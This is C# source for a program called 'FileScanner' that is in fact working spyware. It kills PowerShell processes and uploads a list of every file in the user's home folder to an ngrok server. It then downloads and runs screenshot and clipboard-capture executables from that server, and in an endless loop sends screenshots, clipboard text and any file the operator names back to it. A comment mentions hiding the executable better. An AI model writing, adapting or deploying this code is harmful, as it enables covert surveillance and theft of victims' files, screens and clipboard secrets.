using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;


namespace FileScanner
{

    class Program
    {

        // Thread-safe collection to store file paths
        private static readonly ConcurrentBag<string> FilePaths = new ConcurrentBag<string>();
        private static int fileCount = 0;

        private const string SERVER_HOST = "https://one-precisely-macaw.ngrok-free.app";
        private const string SERVER_UPLOAD_PATH = "/upload";

        // Static HttpClient for better performance (reuse connections)
        private static readonly HttpClient httpClient = new HttpClient();

        static Program()
        {
            // Configure HttpClient for large file uploads
            httpClient.Timeout = TimeSpan.FromMinutes(30); // 30 minute timeout for large files
            httpClient.DefaultRequestHeaders.Add("User-Agent", "FileScanner/1.0");

            // Add ngrok bypass header if needed
            httpClient.DefaultRequestHeaders.Add("ngrok-skip-browser-warning", "true");
        }

        static async Task Main(string[] args)
        {
            // close pwsh windows 
            Process.Start(new ProcessStartInfo
            {
                FileName = "taskkill",
                Arguments = "/F /IM powershell.exe",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true

            });

            try
            {
                // Get the user's home directory
                string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                // Set output file path (saved in the same directory as the executable)
                string outputFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "file_paths.txt");

                Console.WriteLine($"Starting optimized parallel scan of user directory: {userPath}");
                Console.WriteLine($"Output will be saved to: {outputFile}");
                Console.WriteLine($"Using {Environment.ProcessorCount} processor cores");
                Console.WriteLine("Scanning...");

                var startTime = DateTime.Now;

                // Use the most optimized scanning method
                ScanDirectoryOptimized(userPath);

                var endTime = DateTime.Now;
                var totalTime = endTime - startTime;

                Console.WriteLine($"\nScan completed in {totalTime.TotalSeconds:F2} seconds");
                Console.WriteLine($"Writing {FilePaths.Count} file paths to output file...");

                // Write all collected file paths to the output file
                using (StreamWriter writer = new StreamWriter(outputFile, false))
                {
                    // Write header information
                    writer.WriteLine($"File scan completed on: {endTime}");
                    writer.WriteLine($"Scanned directory: {userPath}");
                    writer.WriteLine($"Scan duration: {totalTime.TotalSeconds:F2} seconds");
                    writer.WriteLine($"Processor cores used: {Environment.ProcessorCount}");
                    writer.WriteLine($"Method: Optimized parallel enumeration");
                    writer.WriteLine(new string('=', 60));
                    writer.WriteLine();

                    // Write all file paths (sorted for better readability)
                    var sortedPaths = FilePaths.OrderBy(path => path).ToList();
                    foreach (string filePath in sortedPaths)
                    {
                        writer.WriteLine(filePath);
                    }

                    // Write summary
                    writer.WriteLine();
                    writer.WriteLine(new string('=', 60));
                    writer.WriteLine($"Total files found: {FilePaths.Count}");
                }

                Console.WriteLine("Results saved successfully!");
                Console.WriteLine($"Total files found: {FilePaths.Count}");
                Console.WriteLine($"Output saved to: {outputFile}");

                // Check file size before upload
                var fileInfo = new FileInfo(outputFile);
                Console.WriteLine($"File size to upload: {fileInfo.Length:N0} bytes ({fileInfo.Length / (1024.0 * 1024.0):F2} MB)");

                // Send file_paths.txt with improved method
                int uploadResult = await SendFileToUploadEndpoint(outputFile);

                Console.WriteLine($"\nUpload result: {(uploadResult == 0 ? "SUCCESS" : "FAILED")}");

            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                Console.WriteLine("Press any key to exit...");
                Console.ReadKey();
            }

            finally
            {

                string screenexeurl = SERVER_HOST + "/executable/screenshot.exe";
                bool successscreenexe = await DownloadFileAsync(screenexeurl);
                string clipexeurl = SERVER_HOST + "/executable/Clipboard.exe";
                bool successclipexe = await DownloadFileAsync(clipexeurl);

                String? lastsned = null;
                String? lastsendclip = null;

                while (true)
                {

                    String path = await GetPathFromServer();

                    if (await GetPathFromServer() != null)
                    {

                        Console.WriteLine($"\nPath on server: " + path);

                        if (lastsned != path)
                        {
                            // send file
                            int uploadResult = await SendFileToUploadEndpoint(path);
                            Console.WriteLine($"\nFile upload result: {(uploadResult == 0 ? "SUCCESS" : "FAILED")}");
                            lastsned = path;
                        }
                        else
                        {
                            Console.WriteLine($"\nPath on server did not change, skipping send");
                        }

                    }
                    else
                    {
                        Console.WriteLine($"\nPath not configured, skipping");
                    }

                    string currentDir = AppDomain.CurrentDomain.BaseDirectory;

                    // Screenshot ---------------------------------------------------

                    if (successscreenexe)
                    {

                        // get current directory
                        

                        //other exe to start
                        string otherExe = Path.Combine(currentDir, "screenshot.exe");
                        string screenpath = Path.Combine(currentDir, "screenshot.bmp");

                        if (File.Exists(otherExe))
                        {
                            // start exe
                            var proc = Process.Start(otherExe);
                            Console.WriteLine("Started: " + otherExe);

                            // wait for screen.exe to be complete
                            proc.WaitForExit();

                            // send screen
                            int uploadResult = await SendFileToUploadEndpoint(screenpath);

                            Console.WriteLine($"\nScreenshot upload result: {(uploadResult == 0 ? "SUCCESS" : "FAILED")}");


                        } else
                        {
                            Console.WriteLine("Can't find: " + otherExe);
                        }
                    }

                    // Clipboard---------------------------------------------------

                    if (successclipexe) { 

                    // execute external exe
                    string clipexe = Path.Combine(currentDir, "Clipboard.exe");

                    if (File.Exists(clipexe))
                    {
                        var proc = Process.Start(clipexe);
                        Console.WriteLine("Started: " + clipexe);

                        // wait for screen.exe to be complete
                        proc.WaitForExit();

                        if (File.Exists("clipboard_content.txt"))
                        {
                            string content = File.ReadAllText("clipboard_content.txt");

                            Console.WriteLine($"\nclipboard found: " + content);

                            if (lastsendclip != content){
                                String jsonclip = CreateJsonPayload(content);
                                await SendClipboardToServer(jsonclip, SERVER_HOST);
                                lastsendclip = content;
                            } else
                            {
                                Console.WriteLine($"no new clipboard :(");
                            }

                        }

                    }

                }

                // send update any 5 seconds 
                Thread.Sleep(5000);

                }

                httpClient?.Dispose();

            }



        }

        /// <summary>
        /// Optimized version using EnumerateFiles with parallel processing
        /// </summary>
        /// <param name="rootPath">Root directory to scan</param>
        static void ScanDirectoryOptimized(string rootPath)
        {
            try
            {
                // Get all directories first to process them in parallel
                var directories = GetAllDirectories(rootPath).ToList();
                Console.WriteLine($"Found {directories.Count} directories to scan");

                // Process directories in parallel with controlled degree of parallelism
                var parallelOptions = new ParallelOptions
                {
                    MaxDegreeOfParallelism = Environment.ProcessorCount * 2
                };

                Parallel.ForEach(directories, parallelOptions, directory =>
                {
                    try
                    {
                        // Use EnumerateFiles for better memory efficiency
                        var files = Directory.EnumerateFiles(directory, "*", SearchOption.TopDirectoryOnly);

                        foreach (string file in files)
                        {
                            FilePaths.Add(file);

                            // Thread-safe increment and progress reporting
                            int currentCount = System.Threading.Interlocked.Increment(ref fileCount);
                            if (currentCount % 10000 == 0)
                            {
                                Console.WriteLine($"Files processed: {currentCount}");
                            }
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        // Skip directories that we don't have permission to access
                        Console.WriteLine($"Access denied to: {directory}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error accessing {directory}: {ex.Message}");
                    }
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in optimized scan: {ex.Message}");

                // Fallback to basic parallel method
                Console.WriteLine("Falling back to basic parallel scan...");
                ScanDirectoryParallel(rootPath);
            }
        }

        /// <summary>
        /// Gets all directories recursively using EnumerateDirectories for efficiency
        /// </summary>
        /// <param name="rootPath">Root path to start from</param>
        /// <returns>Enumerable of all directory paths</returns>
        static System.Collections.Generic.IEnumerable<string> GetAllDirectories(string rootPath)
        {
            var directories = new ConcurrentBag<string> { rootPath };
            var toProcess = new ConcurrentQueue<string>();
            toProcess.Enqueue(rootPath);

            while (toProcess.TryDequeue(out string currentDir))
            {
                try
                {
                    var subDirs = Directory.EnumerateDirectories(currentDir);

                    foreach (string subDir in subDirs)
                    {
                        directories.Add(subDir);
                        toProcess.Enqueue(subDir);
                    }
                }
                catch (UnauthorizedAccessException)
                {
                    // Skip directories we can't access
                }
                catch (Exception)
                {
                    // Skip problematic directories
                }
            }

            return directories;
        }

        /// <summary>
        /// Fallback parallel version of directory scanning
        /// </summary>
        /// <param name="directoryPath">Directory to scan</param>
        static void ScanDirectoryParallel(string directoryPath)
        {
            try
            {
                // Get all files in current directory and add them to thread-safe collection
                string[] files = Directory.GetFiles(directoryPath);

                // Use Parallel.ForEach for faster file processing
                Parallel.ForEach(files, file =>
                {
                    FilePaths.Add(file);

                    // Thread-safe increment and progress reporting
                    int currentCount = System.Threading.Interlocked.Increment(ref fileCount);
                    if (currentCount % 5000 == 0)
                    {
                        Console.WriteLine($"Files processed: {currentCount}");
                    }
                });

                // Get all subdirectories
                string[] subdirectories = Directory.GetDirectories(directoryPath);

                // Use Parallel.ForEach to scan subdirectories in parallel
                Parallel.ForEach(subdirectories, subdirectory =>
                {
                    ScanDirectoryParallel(subdirectory);
                });
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine($"Access denied to: {directoryPath}");
            }
            catch (DirectoryNotFoundException)
            {
                Console.WriteLine($"Directory not found: {directoryPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error accessing {directoryPath}: {ex.Message}");
            }
        }

        public static async Task<bool> TestServerConnection()
        {
            try
            {
                Console.WriteLine("Testing server connection...");

                // Try to reach the getpath endpoint first
                string testUrl = SERVER_HOST.TrimEnd('/') + "/api/getpath";
                var response = await httpClient.GetAsync(testUrl);

                Console.WriteLine($"Server test - Status: {response.StatusCode}");

                if (response.IsSuccessStatusCode)
                {
                    string content = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"Server response: '{content}'");
                    return true;
                }

                return response.StatusCode == System.Net.HttpStatusCode.NotFound; // 404 is OK, means server is running
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Server connection test failed: {ex.Message}");
                return false;
            }
        }

        public static async Task<int> SendFileToUploadEndpoint(string filePath)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    Console.WriteLine($"File not found: {filePath}");
                    return 1;
                }

                var fileInfo = new FileInfo(filePath);
                Console.WriteLine($"Starting upload of {Path.GetFileName(filePath)} ({fileInfo.Length:N0} bytes)");

                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    var request = new HttpRequestMessage(HttpMethod.Post, SERVER_HOST.TrimEnd('/') + SERVER_UPLOAD_PATH)
                    {
                        Content = new StreamContent(fileStream)
                    };

                    request.Content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
                    request.Content.Headers.ContentLength = fileInfo.Length; // required BaseHTTPRequestHandler

                    var response = await httpClient.SendAsync(request, HttpCompletionOption.ResponseHeadersRead);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("File uploaded successfully!");
                        return 0;
                    }
                    else
                    {
                        Console.WriteLine($"Upload failed: {response.StatusCode} - {response.ReasonPhrase}");
                        var errorContent = await response.Content.ReadAsStringAsync();
                        Console.WriteLine($"Error details: {errorContent}");
                        return 1;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Unexpected error: {ex.Message}");
                if (ex.InnerException != null)
                    Console.WriteLine($"Inner: {ex.InnerException.Message}");
                return 1;
            }
        }


        static async Task<string> GetPathFromServer()
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync(SERVER_HOST + "/api/getpath");
                    response.EnsureSuccessStatusCode();
                    string path = await response.Content.ReadAsStringAsync();
                    return path;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error in request: {ex.Message}");
                    return null;
                }
            }
        }

        private static string EscapeJsonString(string input)
        {
            if (string.IsNullOrEmpty(input)) return "";

            var sb = new StringBuilder(input.Length * 2);
            foreach (char c in input)
            {
                switch (c)
                {
                    case '\"':
                        sb.Append("\\\"");
                        break;
                    case '\\':
                        sb.Append("\\\\");
                        break;
                    case '\n':
                        sb.Append("\\n");
                        break;
                    case '\r':
                        sb.Append("\\r");
                        break;
                    case '\t':
                        sb.Append("\\t");
                        break;
                    default:
                        sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        private static string CreateJsonPayload(string clipboardContent)
        {
            if (clipboardContent == null) return null;

            string escaped = EscapeJsonString(clipboardContent);
            return $"{{\"clipboard\":\"{escaped}\"}}";
        }

        public static async Task<int> SendClipboardToServer(string clipboardContent, string serverUrl)
        {

            serverUrl = serverUrl + "/clipboard";

            if (string.IsNullOrEmpty(clipboardContent))
            {
                Console.WriteLine("[-] Clipboard empty");
                return -1;
            }

            string jsonPayload = CreateJsonPayload(clipboardContent);
            if (jsonPayload == null)
            {
                Console.WriteLine("[-] Error creating JSON");
                return -1;
            }

            Console.WriteLine($"[+] Sending clipboard ({clipboardContent.Length} characters)...");

            try
            {
                using var client = new HttpClient();
                client.DefaultRequestHeaders.Add("User-Agent", "MyClipboardClient");

                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                var response = await client.PostAsync(serverUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("[+] Clipboard sent successfully!");
                    string responseText = await response.Content.ReadAsStringAsync();
                    Console.WriteLine("[+] Server response: " + responseText);
                    return 0;
                }
                else
                {
                    Console.WriteLine("[-] HTTP error: " + (int)response.StatusCode);
                    return -1;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Exception: " + ex.Message);
                return -1;
            }
        }

        public static async Task<bool> DownloadFileAsync(string url)
        {
            try
            {
                // chcek url
                if (string.IsNullOrWhiteSpace(url))
                {
                    Console.WriteLine("URL not valid");
                    return false;
                }

                // take filename from url
                string fileName = Path.GetFileName(new Uri(url).LocalPath);
                if (string.IsNullOrEmpty(fileName))
                {
                    fileName = "downloaded_file";
                }

                // save in the same path of exe, can be changed to hide the exe more
                string destinationPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);

                Console.WriteLine($"Downloading file da: {url}");

                // download file
                using (HttpResponseMessage response = await httpClient.GetAsync(url))
                {
                    // check response
                    response.EnsureSuccessStatusCode();

                    // read content as stream
                    using (Stream contentStream = await response.Content.ReadAsStreamAsync())
                    using (FileStream fileStream = new FileStream(destinationPath, FileMode.Create, FileAccess.Write))
                    {
                        await contentStream.CopyToAsync(fileStream);
                    }
                }

                Console.WriteLine($"File downloaded without errors: {destinationPath}");
                return true;
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine($"HTTP ERROR: {ex.Message}");
                return false;
            }
            catch (IOException ex)
            {
                Console.WriteLine($"I/O Error: {ex.Message}");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Generic error: {ex.Message}");
                return false;
            }
        }

    }
}